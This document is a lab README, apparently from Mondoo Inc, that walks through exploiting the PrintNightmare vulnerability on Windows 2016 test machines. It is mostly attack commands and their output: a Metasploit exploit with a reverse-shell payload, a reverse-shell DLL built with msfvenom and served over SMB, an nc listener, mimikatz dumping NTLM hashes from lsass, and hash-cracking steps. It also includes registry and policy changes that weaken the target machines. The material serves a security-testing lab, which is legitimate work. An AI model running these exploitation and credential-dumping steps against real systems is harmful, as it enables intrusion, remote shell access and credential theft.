# Printnightmare (CVE-2021-34527)

## Win 2016 in AWS

- start Kali Linux ec2 instance in eu-central-1
- start Windows 2016 ec2 instance (ami-0808d6a0d91e57fd3) in eu-central-1
- allow all communications between kali and windows

```bash
ssh kali@<kali ip>
```

- start metasploit framework on the kali vm

```bash
msfconsole
```

- configure metasploit framework to exploit printnightmare vulnerability

```bash
msf6 > use exploit/windows/dcerpc/cve_2021_1675_printnightmare
msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set RHOSTS <windows-privat-ip-address>
msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set SMBUSER mondoo
msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set SMBPASS mondoo.com
msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set payload windows/x64/shell_reverse_tcp
msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > run

msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > run

[*] Started reverse TCP handler on 10.0.4.196:4444 
[*] 10.0.4.131:445 - Running automatic check ("set AutoCheck false" to disable)
[*] 10.0.4.131:445 - Target environment: Windows v10.0.14393 (x64)
[*] 10.0.4.131:445 - Enumerating the installed printer drivers...
[*] 10.0.4.131:445 - Retrieving the path of the printer driver directory...
[+] 10.0.4.131:445 - The target is vulnerable. Received ERROR_BAD_NET_NAME, implying the target is vulnerable.
[*] 10.0.4.131:445 - Server is running. Listening on 10.0.4.196:445
[*] 10.0.4.131:445 - Server started.
[*] 10.0.4.131:445 - The named pipe connection was broken, reconnecting...
[*] 10.0.4.131:445 - Successfully reconnected to the named pipe.
[*] 10.0.4.131:445 - The named pipe connection was broken, reconnecting...
[*] Command shell session 1 opened (10.0.4.196:4444 -> 10.0.4.131:51572) at 2022-06-03 10:31:46 +0000
[*] 10.0.4.131:445 - Server stopped.


Shell Banner:
Microsoft Windows [Version 10.0.14393]
-----
          

C:\Windows\system32>
```

- download mimikatz to the windows vm

```powershell
C:\Windows\system32>powershell
powershell
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

PS C:\Windows\system32> wget "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip" -outfile "C:\windows\temp\mimikatz_trunk.zip"
wget "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip" -outfile "C:\windows\temp\mimikatz_trunk.zip"
```

- exract the mimikatz zip file

```powershell
PS C:\Windows\system32> cd C:\windows\temp\
cd C:\windows\temp\

PS C:\windows\temp> Expand-Archive mimikatz_trunk.zip -Force
Expand-Archive mimikatz_trunk.zip -Force

PS C:\windows\temp> cd mimikatz_trunk\x64
cd mimikatz_trunk\x64
```

- start mimikatz and dump credentials from windows `lsass.exe` process

```powershell
PS C:\windows\temp\mimikatz_trunk\x64> .\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::msv

Authentication Id : 0 ; 3255438 (00000000:0031ac8e)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : EC2AMAZ-5A4CSBH
Logon Server      : EC2AMAZ-5A4CSBH
Logon Time        : 6/3/2022 9:35:18 AM
SID               : S-1-5-21-2073652273-2496418537-3488842278-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : EC2AMAZ-5A4CSBH
         * NTLM     : 7facdc498ed1680c4fd1448319a8c04f
         * SHA1     : 24b8b6c9cbe3cd8818683ab9cd0d3de14fc5c40b
.......
```

- use the web page [https://crackstation.net/](https://crackstation.net/) to crack the NTLM-hash of the Administrator

## Win2016 Detectionlab VM (vagrant)
- start a vagrant vm

~~~ text
config.vm.define "win2016detect" do |win2016detect|
  win2016detect.vm.box = "detectionlab/win2016"
  win2016detect.vm.box_version = "1.0"
  win2016detect.vm.network "private_network", ip: '192.168.56.248'
end
~~~

~~~
xfreerdp /u:vagrant /v:192.168.56.248:3389 /h:2048 /w:2048
~~~

- disable firewall

~~~ powershell
netsh advfirewall set allprofiles state off
~~~

- apply registry entries, double klick on file printer-settings.reg

~~~
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers]
"RegisterSpoolerRemoteRpcEndPoint"=dword:00000001
"KMPrintersAreBlocked"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint]
"Restricted"=dword:00000000
"TrustedServers"=dword:00000000
"InForest"=dword:00000000
"RestrictDriverInstallationToAdministrators"=dword:00000000
"NoWarningNoElevationOnInstall"=dword:00000001
~~~

- disable password complexity policy

~~~
secedit /export /cfg C:\secpol.cfg
(gc C:\secpol.cfg).replace("PasswordComplexity = 1", "PasswordComplexity = 0") | Out-File C:\secpol.cfg
secedit /configure /db C:\Windows\security\local.sdb /cfg C:\secpol.cfg /areas SECURITYPOLICY
~~~

- create unprivileged user

~~~ powershell
$PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String mondoo.com
New-LocalUser -Name "mondoo" -Description "mondoo.com" -Password $PASSWORD
Add-LocalGroupMember -Group "Users" -Member "mondoo"
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "mondoo"
~~~

- enable pass the hash authentication
  - https://www.techinpost.com/account-restrictions-are-preventing-this-user-from-signing-in/

- install mondoo agent on it and add the two mondoo policies to it

- start samba server in folder hacks

~~~ bash
sudo smbserver.py smb ./
~~~

- create reverse shell in folder hacks

~~~ bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f dll -o rev.dll
~~~

- start listener

~~~ bash
nc -lnvp 4444
~~~

- start metasploit

~~~ text
use auxiliary/admin/dcerpc/cve_2021_1675_printnightmare

set RHOSTS 192.168.56.248

set SMBUSER mondoo

set SMBPASS mondoo.com

set DLL_PATH \\\\192.168.56.1\\smb\\rev.dll
~~~

- donwload mimikatz via SMB Share

~~~ powershell
Copy-Item \\192.168.56.1\smb\mimikatz_trunk.zip -Destination C:\Windows\Temp\

cd C:\Windows\Temp\

Expand-Archive mimikatz_trunk.zip

cd mimikatz_trunk\x64

.\mimikatz.exe

privilege::debug

sekurlsa::msv
~~~

- for hashcat use the follwoing format

~~~ text
mondoo:::9fbdcca25c0a63ed4e1b84592cd628c7:::
vagrant:::e02bc503339d51f71d913c245d35b50b:::
Administrator:::31d6cfe0d16ae931b73c59d7e0c089c0:::
~~~

### SeDbugPriv

~~~ powershell
Copy-Item \\192.168.56.1\smb\mimikatz_trunk.zip -Destination C:\Windows\Temp\

cd C:\Windows\Temp\

Expand-Archive mimikatz_trunk.zip

cd mimikatz_trunk\x64

.\mimikatz.exe

privilege::debug

sekurlsa::msv
~~~

## License and Author

* Author:: Mondoo Inc

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

## Disclaimer

This or previous program is for Educational purpose ONLY. Do not use it without permission. The usual disclaimer applies, especially the fact that we (Mondoo Inc) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears NO responsibility for content or misuse of these programs or any derivatives thereof. By using these programs you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these programs is not Mondoo Inc's responsibility.